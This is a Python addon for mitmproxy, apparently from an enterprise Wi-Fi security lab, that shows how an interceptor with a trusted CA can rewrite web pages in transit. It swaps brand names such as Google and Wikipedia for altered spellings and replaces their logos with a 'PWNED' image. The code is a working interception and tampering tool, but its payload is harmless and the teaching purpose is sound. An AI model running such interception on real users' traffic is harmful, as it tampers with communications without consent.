#!/usr/bin/env python3
"""
Enterprise WiFi Lab — Active content modification demo addon.

Demonstrates that a MITM attacker with a trusted CA can silently modify
page content in transit — not just observe it.

REQUIRES: Demo B mode (mitmproxy CA must be trusted on the client device).
Without a trusted CA the browser rejects the connection before any content
arrives, so no modification is possible.

Usage (manual):
  sudo systemctl stop enterprise.service
  sudo mitmdump --mode transparent --showhost --listen-port 8080 \\
                --listen-host 0.0.0.0 --set tls_version_client_min=TLS1_2 \\
                -s /path/to/mitm_demo_modify.py

Or activate via the lab helper:
  sudo PROXY_DEMO_MODIFY=1 systemctl restart enterprise.service
  (after running enterprise_lab.sh once to generate the service file)

Customise the REPLACEMENTS and LOGO_PATTERNS lists below.
"""

import re
from mitmproxy import http

# ---------------------------------------------------------------------------
# Text replacements — applied to HTML, JS and SVG responses.
# Each entry: (bytes_to_find, bytes_to_replace_with)
# ---------------------------------------------------------------------------
REPLACEMENTS: list[tuple[bytes, bytes]] = [
    (b"Google",        b"Gooogle"),
    (b"google",        b"gooogle"),
    (b"GOOGLE",        b"GOOOGLE"),
    # Bing (not pinned in Firefox — good demo target)
    (b"Bing",          b"B1ng"),
    (b"bing",          b"b1ng"),
    (b"Microsoft",     b"M1crosoft"),
    # Other non-pinned fallback targets
    (b"Example Domain", b"HACKED Domain"),
    (b"Wikipedia",      b"Wikip3dia"),
]

# Content types whose body will be inspected for text replacements.
MODIFY_TYPES = (
    "text/html",
    "text/javascript",
    "application/javascript",
    "application/x-javascript",
    "image/svg+xml",
)

# ---------------------------------------------------------------------------
# Logo replacement — intercept image requests by URL pattern and return a
# custom SVG regardless of the original content type (PNG/WebP/SVG).
# Browsers render SVG fine in <img> tags when content-type is image/svg+xml.
# ---------------------------------------------------------------------------
LOGO_PATTERNS: list[re.Pattern] = [
    # Google logo (served from www.google.com)
    re.compile(r'google\.com/images/branding/googlelogo'),
    re.compile(r'google\.com/logos/'),
    # Wikipedia globe logo (www.wikipedia.org and upload.wikimedia.org)
    re.compile(r'Wikipedia-logo', re.IGNORECASE),
    re.compile(r'wikipedia\.org.*\.(png|svg|webp)', re.IGNORECASE),
]

# SVG image returned in place of matched logos.
HACKED_SVG = b"""<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 100">
  <rect width="300" height="100" fill="#cc0000" rx="8"/>
  <text x="150" y="44" font-family="monospace" font-size="30" font-weight="bold"
        fill="white" text-anchor="middle">PWNED</text>
  <text x="150" y="74" font-family="monospace" font-size="15"
        fill="#ffcccc" text-anchor="middle">WiFi Security Lab</text>
</svg>"""

# ---------------------------------------------------------------------------
# Addon logic
# ---------------------------------------------------------------------------

def response(flow: http.HTTPFlow) -> None:
    """Called by mitmproxy for every HTTP response passing through."""
    url = flow.request.pretty_url

    # Logo replacement: check URL before content-type filtering.
    for pattern in LOGO_PATTERNS:
        if pattern.search(url):
            flow.response.set_content(HACKED_SVG)
            flow.response.headers["content-type"] = "image/svg+xml"
            flow.response.headers.pop("content-encoding", None)
            print(f"[logo]   {flow.request.pretty_host} — replaced logo: {url}")
            return

    # Text replacement: only for matching content types.
    content_type = flow.response.headers.get("content-type", "").lower()
    if not any(mt in content_type for mt in MODIFY_TYPES):
        return

    # get_content() transparently decompresses gzip / brotli / deflate.
    content = flow.response.get_content()
    if not content:
        return

    modified = content
    for find, replace in REPLACEMENTS:
        modified = modified.replace(find, replace)

    if modified != content:
        # set_content() recompresses with the original Content-Encoding.
        flow.response.set_content(modified)
        print(
            f"[modify] {flow.request.pretty_host}"
            f" — rewrote response ({len(content)} → {len(modified)} bytes)"
        )
